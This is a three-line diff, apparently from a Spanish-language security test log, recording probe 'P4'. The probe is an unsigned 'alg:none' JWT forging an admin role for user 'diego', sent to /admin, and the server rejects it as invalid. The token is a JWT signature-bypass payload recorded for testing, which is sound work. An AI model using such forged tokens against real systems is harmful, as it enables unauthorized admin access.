@@ -1,0 +1,3 @@
+# P4: token alg:none (firma vacia) contra /admin
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJkaWVnbyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NTE0MDQwNSwiZXhwIjoxNzk1MTQ0MDA1fQ.
+{"error": "token invalido o expirado"}
